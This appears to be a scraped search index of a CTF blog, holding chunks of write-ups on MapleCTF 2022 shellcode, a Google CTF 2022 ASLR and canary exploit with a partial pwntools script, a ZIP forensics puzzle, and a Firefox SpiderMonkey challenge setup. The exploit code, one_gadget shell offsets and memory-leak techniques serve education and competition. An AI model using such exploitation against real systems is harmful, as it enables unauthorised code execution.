BitVec('x1', 16) x2 = BitVec('x2', 16) x3 = BitVec('x3', 16) x4 = BitVec('x4', 16) x5 = BitVec('x5', 16) x6 = BitVec('x6', 16) x7 = BitVec('x7', 16) # Below is the initial state a = BitVecVal(int(numbers[1], 16), 16) b = BitVecVal(int(numbers[2], 16), 16) c = BitVecVal(int(numbers[3], 16), 16) d = BitVecVal(int(numbers[4], 16), 16) e = BitVecVal(int(numbers[5], 16), 16) f = BitVecVal(int(numbers[6], 16), 16) g = BitVecVal(int(numbers[7], 16), 16) # Below is the target state that we want target_7 = BitVecVal(int.from_bytes(payload[:2], \"little\"), 16) target_6 = BitVecVal(int.from_bytes(payload[2:4], \"little\"), 16) target_5 = BitVecVal(int.from_bytes(payload[4:6], \"little\"), 16) target_4 = BitVecVal(int.from_bytes(payload[6:8], \"little\"), 16) target_3 = BitVecVal(int.from_bytes(payload[8:10], \"little\"), 16) target_2 = BitVecVal(int.from_bytes(payload[10:12], \"little\"), 16) target_1 = BitVecVal(int.from_bytes(payload[12:14], \"little\"), 16) # Below is the constraints that we pass to the z3 # Notes that below is the z3 equations that we derive from the game's rule s.add( a + x1 + x2 == target_1, b + x1 + x2 + x3 == target_2, c + x2 + x3 + x4 == target_3, d + x3 + x4 + x5 == target_4, e + x4 + x5 + x6 == target_5, f + x5 + x6 + x7 == target_6, g + x6 + x7 == target_7, ) Notice that even though the max index is 8, we can only have 7 in the z3, which means the max desired value size is 14 bytes. The z3 couldn‚Äôt solve the equations if we try to set the target state to 16 bytes, so we concluded that the limit is 14 bytes (where it‚Äôs always sat). To execute our plan, first, we will need to craft 14-bytes shellcode. The constraint is pretty short and seems impossible, but luckily during debugging with GDB, I found some good values. First, I was checking the register value right after we do call rdx (which is calling the stored main_play address). Notice that: rbx is 0 rcx contains libc address rdx and rsi isn‚Äôt zero yet We‚Äôve already had a libc address in our register for our shellcode. This will help us a lot. But first, let‚Äôs try to find out which libc is used by the challenge. How to get the libc? Because we have the Dockerfile, we can simply build it and take the libc.so.6 file from /usr/lib/x86_64-linux-gnu/. Now, let‚Äôs use one_gadget to the retrieved libc, to find the shell address and rules to be followed. Below is the result: one_gadget /usr/lib/x86_64-linux-gnu/libc.so.6 0x50a37 posix_spawn(rsp+0x1c, \"/bin/sh\", 0, rbp, rsp+0x60, environ) constraints: rsp \u0026 0xf == 0 rcx == NULL rbp == NULL || (u16)[rbp] == NULL 0xebcf1 execve(\"/bin/sh\", r10, [rbp-0x70]) constraints: address rbp-0x78 is writable [r10] == NULL || r10 == NULL [[rbp-0x70]] == NULL || [rbp-0x70] == NULL 0xebcf5 execve(\"/bin/sh\", r10, rdx) constraints: address rbp-0x78 is writable [r10] == NULL || r10 == NULL [rdx] == NULL || rdx == NULL 0xebcf8 execve(\"/bin/sh\", rsi, rdx) constraints: address rbp-0x78 is writable [rsi] == NULL || rsi == NULL [rdx] == NULL || rdx == NULL With this, we hoped that jumping to the given gadget can be fitted into the 14-bytes space. Let‚Äôs start crafting our shellcode by incrementing/subtracting the stored rcx so that it points to the one_gadget‚Äôs result. We use the third gadget (0xebcf8) because using rsi or rdx will decrease the shellcode‚Äôs size. sub rcx, 0x28d3f The above line will need 7 bytes, so we can only have 7 bytes more to complete the gadget call. ","date":"Aug 29, 2022","objectID":"/posts/maplectf-2022/:2:3","tags":["Writeup","MapleCTF","pwn","format string","shellcode"],"title":"MapleCTF 2022","uri":"/posts/maplectf-2022/"},{"categories":null,"content":" During this weekend, I played GoogleCTF with my team idek. I managed to solve two challenges, collaborating with my super teammates. We managed to get 20th place üòÑ Pwn ","date":"Jul 04, 2022","objectID":"/posts/google-ctf-2022/:0:0","tags":["Writeup","Google CTF","pwn","aslr","buffer overflow","rop","oob","prng","zip","forensic","2022"],"title":"Google CTF 2022","uri":"/posts/google-ctf-2022/"},{"categories":null,"content":"Fixed ASLR I wasn‚Äôt happy with the default ASLR, so I fixed it. The flag is in a file called ‚Äúflag‚Äù both in / and cwd. I worked on this challenge together with my teammate pivik. Thanks a lot pivik! ","date":"Jul 04, 2022","objectID":"/posts/google-ctf-2022/:1:0","tags":["Writeup","Google CTF","pwn","aslr","buffer overflow","rop","oob","prng","zip","forensic","2022"],"title":"Google CTF 2022","uri":"/posts/google-ctf-2022/"},{"categories":null,"content":"Initial Analysis We were given a lot of files, where one of them is the main binary called loader, and the rest are object files. Now, let‚Äôs try to run the program first so that we can know how the program works. ./loader ______ Welcome to the / ____/___ _____ ___ ___ / / __/ __ `/ __ `__ \\/ _ \\ / /_/ / /_/ / / / / / / __/ \\____/\\__,_/_/ /_/ /_/\\___/ -=*) MAIN MENU: 1) Play The Game 2) See full scoreboard 3) See score for place 4) Exit Your choice? 1 Have Fun, Good Luck! Round 1 How much is 0 + 3 ? 3 Yes! +5pts! You have 5pts total. ... [truncated] ... Round 11 How much is 3 + 7 ? 10 Yes! +5pts! You have 55pts total. Round 12 How much is 2 + 9 ? 0 Wrong! Game Over! Congratulations! You're going to the SCOREBOARD! How long is your name (0-31)? 8 Now type in your name: Chovid99 -=*) MAIN MENU: 1) Play The Game 2) See full scoreboard 3) See score for place 4) Exit Your choice? Come again? -=*) MAIN MENU: 1) Play The Game 2) See full scoreboard 3) See score for place 4) Exit Your choice? 2 -=*) SCOREBOARD: 0. 95pts --- Gary 1. 90pts --- Yoel 2. 85pts --- Nicholas 3. 80pts --- Vanessa 4. 75pts --- Alice 5. 70pts --- Elizabeth 6. 65pts --- Linda 7. 60pts --- Peter 8. 55pts --- Wayne 9. 55pts --- Chovid99 -=*) MAIN MENU: 1) Play The Game 2) See full scoreboard 3) See score for place 4) Exit Your choice? 3 Which place's score do you want to see (0-9)? 0 To get this place you need to beat this score: 95 -=*) MAIN MENU: 1) Play The Game 2) See full scoreboard 3) See score for place 4) Exit Your choice? 4 Alright, bye WINNER: Gary Ah okay. Playing around with the binary gave us enough knowledge of how the binary works. We have 4 menus that we can interact: The first menu will start the math game Each correct answer gave you 5 pts If your score is high enough to be placed on the scoreboard, they will ask your name and then store it on the scoreboard The second menu will show the full scoreboard The third menu will show the score value of the scoreboard[input_idx] The fourth menu will exit the game Now we‚Äôve got the idea of how the binary works, let‚Äôs try analyzing all of the given files. I use Ghidra as my binary analyzer. Decompilation of game.o Looking around the given file, turn out that most of the above game methods are defined under game.o file. So, let‚Äôs try to analyze the game.o file decompiled results to understand better. We can start by checking the menu method, which checking the decompiled version is pretty similar to what we have interacted with before. undefined8 menu(void) { char cVar1; byte bVar2; undefined8 uVar3; long in_FS_OFFSET; undefined local_38 [40]; long local_10; local_10 = *(long *)(in_FS_OFFSET + 0x28); puts( \"\\n-=*) MAIN MENU:\\n 1) Play The Game\\n 2) See full scoreboard\\n 3) See score for place\\n 4) Exit\\nYour choice?\" ); cVar1 = readline(local_38,0x20); if (cVar1 == '\\x01') { bVar2 = atou64(local_38); if (bVar2 == 4) { puts(\"Alright, bye\"); uVar3 = 0; } else { if (bVar2 \u003c 5) { if (bVar2 == 3) { see_scoreboard(); uVar3 = 1; goto LAB_00100829; } if (bVar2 \u003c 4) { if (bVar2 == 1) { game(); uVar3 = 1; goto LAB_00100829; } if (bVar2 == 2) { see_full_scoreboard(); uVar3 = 1; goto LAB_00100829; } } } puts(\"Come again?\"); uVar3 = 1; } } else { uVar3 = 0; } LAB_00100829: if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) { return uVar3; } /* WARNING: Subroutine does not return */ __stack_chk_fail(); } From this menu method, we can see that each menu that we chose before, they have its method to handle the menu. Let‚Äôs try to check the first main menu decompiled result, which is defined under game method. void game(void) { char cVar1; uint uVar2; char cVar3; char cVar4; long in_FS_OFFSET; long local_68; long local_60; char local_58 [32]; undefined local_38 [40]; long local_10; local_10 = *(long *)(in_FS_OFFSET + 0x28); puts(\"Have Fun, Good Luck!\"); local_68 = 0; local_60 = 1; do { print(\"\\nRound \"); u64toa(local_58,local_60); puts(local_58); uVar2 = rand(); cVar3 = (char)uVar2 + (char)(uVar2 / 10) * -10; uVar2 = rand(); cV","date":"Jul 04, 2022","objectID":"/posts/google-ctf-2022/:1:1","tags":["Writeup","Google CTF","pwn","aslr","buffer overflow","rop","oob","prng","zip","forensic","2022"],"title":"Google CTF 2022","uri":"/posts/google-ctf-2022/"},{"categories":null,"content":"Exploitation Plan Now we have finished our initial analysis, we will need to craft a plan. From the above initial analysis, what we have gathered so far: We can leak the canary value if we‚Äôre able to retrieve the rand() results of the aslr_get_addr value, which is the aslr base address of each loaded object file region. There is BOF in the get_player_name method. This indicates that to be able to perform ROP, we will need to play the game until we got into the scoreboard + we need canary value. There is OOB in the see_scoreboard method. We need to be able to leak some useful values Hopefully, with this OOB, we can leak the rand() results. Recover rand() value Our first step will be recovering the rand() values which are used as the aslr of each loaded object region. So, let‚Äôs try to set up our gdb and then explore how the values are initialized. This is my breakpoint setup b *init_stack_guard+85 b *aslr_get_addr+37 The first breakpoint will be used to get the canary value just for sanity checking. The second breakpoint will be used to retrieve the rand() result of the aslr method. Let‚Äôs try stepping on the gdb. $rax : 0x75924ac4cc2d256a $rbx : 0x0 $rcx : 0x3a $rdx : 0x75924ac4cc2d256a $rsp : 0x007fffffffdcb8 ‚Üí 0x0000000000000008 $rbp : 0x007fffffffdcc8 ‚Üí 0x007fffffffdcf8 ‚Üí 0x0000000000000000 $rsi : 0x007ffff7ff8000 ‚Üí 0x0000000000000000 $rdi : 0x3a $rip : 0x00000000402168 ‚Üí \u003cinit_stack_guard+85\u003e mov rdi, rax $r8 : 0x0 $r9 : 0x0 $r10 : 0x22 $r11 : 0x206 $r12 : 0x0 $r13 : 0x0 $r14 : 0x0 $r15 : 0x0 $eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification] $cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ stack ‚îÄ‚îÄ‚îÄ‚îÄ 0x007fffffffdcb8‚îÇ+0x0000: 0x0000000000000008 ‚Üê $rsp 0x007fffffffdcc0‚îÇ+0x0008: 0x007ffff7ff8000 ‚Üí 0x0000000000000000 0x007fffffffdcc8‚îÇ+0x0010: 0x007fffffffdcf8 ‚Üí 0x0000000000000000 ‚Üê $rbp 0x007fffffffdcd0‚îÇ+0x0018: 0x000000004023e8 ‚Üí \u003c_start+42\u003e mov DWORD PTR [rbp-0x4], 0x0 0x007fffffffdcd8‚îÇ+0x0020: 0x0000000000000000 0x007fffffffdce0‚îÇ+0x0028: 0x0000000000000000 0x007fffffffdce8‚îÇ+0x0030: 0x0000000000000000 0x007fffffffdcf0‚îÇ+0x0038: 0x0000000000000000 ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ code:x86:64 ‚îÄ‚îÄ‚îÄ‚îÄ 0x402159 \u003cinit_stack_guard+70\u003e call 0x40100d \u003csyscall2\u003e 0x40215e \u003cinit_stack_guard+75\u003e mov edi, 0x40 0x402163 \u003cinit_stack_guard+80\u003e call 0x40146c \u003crand\u003e ‚Üí 0x402168 \u003cinit_stack_guard+85\u003e mov rdi, rax 0x40216b \u003cinit_stack_guard+88\u003e call 0x401064 \u003cwrite_stack_guard\u003e 0x402170 \u003cinit_stack_guard+93\u003e nop 0x402171 \u003cinit_stack_guard+94\u003e leave 0x402172 \u003cinit_stack_guard+95\u003e ret 0x402173 \u003cpivot_to_main+0\u003e endbr64 ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ threads ‚îÄ‚îÄ‚îÄ‚îÄ [#0] Id 1, Name: \"loader\", stopped 0x402168 in init_stack_guard (), reason: BREAKPOINT ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ trace ‚îÄ‚îÄ‚îÄ‚îÄ [#0] 0x402168 ‚Üí init_stack_guard() ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ gef‚û§ We hit our first breakpoint, and rax is the canary value. Let‚Äôs continue and take notes on the rax value on each breakpoint because it is the rand() result. I won‚Äôt display the result here because it‚Äôs too long. After stepping 7 times, these are the rand() consecutive results (which are retrieved from rax values on each break). 0x42f, 0xf90, 0x97e, 0x7ab, 0xc92, 0x6fe, 0xf0b Now, let‚Äôs check the vmmap to confirm that this 12-bits number is indeed used as the base address of each loaded object. gef‚û§ vmmap [ Legend: Code | Heap | Stack ] Start End Offset Perm Path 0x000042f0000000 0x000042f0002000 0x00000000000000 r-x 0x00004","date":"Jul 04, 2022","objectID":"/posts/google-ctf-2022/:1:2","tags":["Writeup","Google CTF","pwn","aslr","buffer overflow","rop","oob","prng","zip","forensic","2022"],"title":"Google CTF 2022","uri":"/posts/google-ctf-2022/"},{"categories":null,"content":"Solution Following the above exploitation plan, below is the full script that I used to execute the plan. I‚Äôve provided detailed comments to explain what the script does. Info Notes that sometimes z3 couldn‚Äôt recover the correct canary value, but we simply retry it, and at somepoint, it will be able to recover the correct canary. from pwn import * from pwn import p64, u64, p32, u32 from z3 import * context.arch = 'amd64' context.encoding = 'latin' context.log_level = 'INFO' warnings.simplefilter(\"ignore\") # Helper method to execute the OOB bug def oob(r, offset): r.sendlineafter(b'Your choice?\\n', b'3') r.sendlineafter(b'see (0-9)?\\n', str(offset).encode()) r.recvuntil(b'score: ') return int(r.recvuntil(b'\\n').strip()) # Helper method to put our score into the scoreboard # and put our BOF payload def play(r, n, payload): r.sendlineafter(b'Your choice?\\n', b'1') for i in range(n): r.recvuntil(b'How much is ') out = r.recvuntil(b' ?\\n').strip()[:-2] ans = eval(out) log.info(f'Question-{i+1}: {out.decode()} = {ans}') r.sendline(str(ans).encode()) r.recvuntil(b'How much is ') out = r.recvuntil(b' ?\\n').strip()[:-2] ans = eval(out)+5 # Make it false log.info(f'Question-{i+2}: {out.decode()} = {ans}') r.sendline(str(ans).encode()) r.sendlineafter(b'(0-31)?\\n', str(len(payload)).encode()) r.sendafter(b'your name:', payload) r.interactive() def conn(): if args.LOCAL: r = process(['./loader'], env={}) if args.PLT_DEBUG: gdb.attach(r, gdbscript='''''') else: r = remote(b'fixedaslr.2022.ctfcompetition.com', 1337) return r r = conn() ''' Recover the rand_state during the first rand() call of aslr_get_addr, which equivalent to the canary value set by init_stack_guard method. We use the OOB bug on scoreboard. Notes that we can only recover 6 of rand() result of the aslr_get_addr method. Each rand() return 12-bit number, which is used as the first 12-bits of each address those used by each object file in this challenge. ''' known_states = [0, 0, 0, 0, 0, 0] # Inspecting via gdb, offset 512 will give us the 1st rand() # result of the aslr_get_addr (taking the first 12-bits only) base_1 = oob(r, 512) known_states[0] = base_1 \u003e\u003e 28 # Inspecting via gdb, offset -1017 will give us the 3rd rand() # result of the aslr_get_addr (taking the first 12-bits only) known_states[2] = oob(r, 2**64-1017) \u003e\u003e 28 # Inspecting via gdb, offset -1019 will give us the 5th rand() # result of the aslr_get_addr (taking the first 12-bits only) base_5 = oob(r, 2**64-1019) known_states[4] = base_5 \u003e\u003e 28 # Inspecting via gdb, one of the address in region started with the 5th result # of the rand() contains an address which the first 12-bits is # the result of the 4th rand() offset_4 = int(((base_5-0x1000+8)-(base_1-0x60)) // 8) if offset_4 \u003c 0: offset_4 = 2**64 + offset_4 base_4 = oob(r, offset_4) known_states[3] = base_4 \u003e\u003e 28 # Inspecting via gdb, one of the address in region started with the 5th result # of the rand() also contains an address which the first 12-bits is # the result of the 6th rand() offset_6 = int(((base_5+0x1000)-(base_1-0x60)) // 8) if offset_6 \u003c 0: offset_6 = 2**64 + offset_6 base_6 = oob(r, offset_6) known_states[5] = base_6 \u003e\u003e 28 # Inspecting via gdb, one of the address in region started with the 4th result # of the rand() also contains an address which the first 12-bits is # the result of the 2nd rand() offset_2 = int(((((base_4 \u003e\u003e 16) \u003c\u003c 16) + 0x38)-(base_1-0x60)) // 8) base_2 = oob(r, offset_2) known_states[1] = base_2 \u003e\u003e 28 # Now we have 6 consecutives rand() result, we will try to recover # the rand_state before the first rand(), which equivalents to # the binary canary value. # We use z3 to solve it. s = Solver() log.info(f'Known states: {known_states}') rand_state = BitVec(\"x\", 64) def rand_extract_bit(a): global rand_state return (rand_state \u003e\u003e a) \u0026 1 def rand_get_bit(): global rand_state x = ( rand_extract_bit(0x3F) ^ rand_extract_bit(0x3D) ^ rand_extract_bit(0x3C) ^ rand_extract_bit(0x3A) ^ 1 ) rand_state = ((rand_state \u003c\u003c 1) % (2**64)) ","date":"Jul 04, 2022","objectID":"/posts/google-ctf-2022/:1:3","tags":["Writeup","Google CTF","pwn","aslr","buffer overflow","rop","oob","prng","zip","forensic","2022"],"title":"Google CTF 2022","uri":"/posts/google-ctf-2022/"},{"categories":null,"content":"Appnote.txt Every single archive manager unpacks this to a different file‚Ä¶ ","date":"Jul 04, 2022","objectID":"/posts/google-ctf-2022/:2:0","tags":["Writeup","Google CTF","pwn","aslr","buffer overflow","rop","oob","prng","zip","forensic","2022"],"title":"Google CTF 2022","uri":"/posts/google-ctf-2022/"},{"categories":null,"content":"Analysis \u0026 Solution We were given a zip file called dump.zip. Trying to extract it, I found that the size of the file‚Äôs output doesn‚Äôt make sense. So, let‚Äôs try to open it in a hex editor. Turn out, as you can see, there are a lot of zip files on there. What makes it more interesting is there are a lot of zip files with the same name (Example: there is a lot of flag00.zip in the file), but with different contents. There are flag00.zip - flag18.zip. Each zip file with the same name contains only one char. In fact, the name indicates the n-th character of the flags. So, with deduction, we can guess that: To get the flag n-th character, we need to know which flag{n}.zip is the correct zip. If we found it, that means the content of its zip is the n-th character of our flag But how do we know the correct zip file? Reading through the appnote.txt of the ZIP file, we can understand how the ZIP signatures work, especially in part 4.3.1 4.3.1 A ZIP file MUST contain an \"end of central directory record\". A ZIP file containing only an \"end of central directory record\" is considered an empty ZIP file. Files MAY be added or replaced within a ZIP file, or deleted. A ZIP file MUST have only one \"end of central directory record\". Other records defined in this specification MAY be used as needed to support storage requirements for individual ZIP files. Now, let‚Äôs check the signature of the end of the central directory record 4.3.16 End of central directory record: end of central dir signature 4 bytes (0x06054b50) number of this disk 2 bytes number of the disk with the start of the central directory 2 bytes total number of entries in the central directory on this disk 2 bytes total number of entries in the central directory 2 bytes size of the central directory 4 bytes offset of start of central directory with respect to the starting disk number 4 bytes .ZIP file comment length 2 bytes .ZIP file comment (variable size) Okay, so the signature is started by 0x06054b50. Searching this pattern in HxD, turn out it gives 21 results. 50 4B 05 06 00 00 00 00 01 00 01 00 00 EE 00 00 CC 00 00 00 B8 01 50 4B 05 06 00 00 00 00 01 00 01 00 5A E4 00 00 88 0A 00 00 A2 01 50 4B 05 06 00 00 00 00 01 00 01 00 93 D7 00 00 65 17 00 00 8C 01 50 4B 05 06 00 00 00 00 01 00 01 00 CC CA 00 00 42 24 00 00 76 01 50 4B 05 06 00 00 00 00 01 00 01 00 69 BF 00 00 BB 2F 00 00 60 01 50 4B 05 06 00 00 00 00 01 00 01 00 CE B6 00 00 6C 38 00 00 4A 01 50 4B 05 06 00 00 00 00 01 00 01 00 29 A5 00 00 27 4A 00 00 34 01 50 4B 05 06 00 00 00 00 01 00 01 00 E7 9C 00 00 7F 52 00 00 1E 01 50 4B 05 06 00 00 00 00 01 00 01 00 42 8B 00 00 3A 64 00 00 08 01 50 4B 05 06 00 00 00 00 01 00 01 00 21 86 00 00 71 69 00 00 F2 00 50 4B 05 06 00 00 00 00 01 00 01 00 71 73 00 00 37 7C 00 00 DC 00 50 4B 05 06 00 00 00 00 01 00 01 00 66 70 00 00 58 7F 00 00 C6 00 50 4B 05 06 00 00 00 00 01 00 01 00 E3 59 00 00 F1 95 00 00 B0 00 50 4B 05 06 00 00 00 00 01 00 01 00 AC 52 00 00 3E 9D 00 00 9A 00 50 4B 05 06 00 00 00 00 01 00 01 00 A2 47 00 00 5E A8 00 00 84 00 50 4B 05 06 00 00 00 00 01 00 01 00 8E 33 00 00 88 BC 00 00 6E 00 50 4B 05 06 00 00 00 00 01 00 01 00 9A 2A 00 00 92 C5 00 00 58 00 50 4B 05 06 00 00 00 00 01 00 01 00 16 1C 00 00 2C D4 00 00 42 00 50 4B 05 06 00 00 00 00 01 00 01 00 38 15 00 00 20 DB 00 00 2C 00 50 4B 05 06 00 00 00 00 01 00 01 00 2F 02 00 00 3F EE 00 00 16 00 50 4B 05 06 00 00 00 00 01 00 01 00 34 F0 00 00 50 00 00 00 00 00 This makes sense, as technically, there is 21 zip in the given file. dump.zip contains hello.txt a zip contains hi.txt 19 zips flag{n}.zip With this end of the central directory, we can know which zip is the correct one. Notice that each end of the central directory has 4-bytes which is the offset of the start of the central directory of the file. With this, we can know which zip is the correct one for each n-th character of the flag. Example: 50 4B 05 06 00 00 00 00 01 00 01 00 5A E4 00 00 88 0A 00 00 A2 01 Checking the 0A88-0x1 offset, it refers to the correct ","date":"Jul 04, 2022","objectID":"/posts/google-ctf-2022/:2:1","tags":["Writeup","Google CTF","pwn","aslr","buffer overflow","rop","oob","prng","zip","forensic","2022"],"title":"Google CTF 2022","uri":"/posts/google-ctf-2022/"},{"categories":null,"content":" TyphoonCon CTF 2022 During the weekdays, I spent my after work time by working on the TyphoonCon CTF challenge, specifically See you Allocator challenge. This is my first time doing a browser pwn challenge, so I wrote this writeup for my future-self and as a training for me to understand it better. I apologize in advance if there is any mistake on my explanation, and feel free to correct me if i‚Äôm wrong. Disclaimer Until now, I honestly don‚Äôt know the intended solution that the authors want (because there are unintended solution which we can directly read the file with the js shell interpreter). But assuming this is like the normal browser pwn challenge, I set on my mind that the intended solution for this chall is to be able get RCE. Pwn ","date":"Jun 25, 2022","objectID":"/posts/typhooncon-ctf-2022/:0:0","tags":["Writeup","TyphoonCon","pwn","heap","firefox","SpiderMonkey","JIT","browser","oob","2022"],"title":"TyphoonCon CTF 2022","uri":"/posts/typhooncon-ctf-2022/"},{"categories":null,"content":"See you Allocator On this challenge, we were given 2 info, the hash commit for the firefox repo and the challenge patch. ","date":"Jun 25, 2022","objectID":"/posts/typhooncon-ctf-2022/:1:0","tags":["Writeup","TyphoonCon","pwn","heap","firefox","SpiderMonkey","JIT","browser","oob","2022"],"title":"TyphoonCon CTF 2022","uri":"/posts/typhooncon-ctf-2022/"},{"categories":null,"content":"Initial Analysis This is my first time doing browser pwn, so maybe the best way for me is to setup the environment first. Environment Setup Reading through this article, below is how we setup and build the js shell. git clone https://github.com/mozilla/gecko-dev.git cd gecko-dev git checkout c1598f6d3edad19ccc53f53ab045d1d29835e1dd git apply ../challenge.patch cp configure.in configure \u0026\u0026 autoconf2.13 mkdir 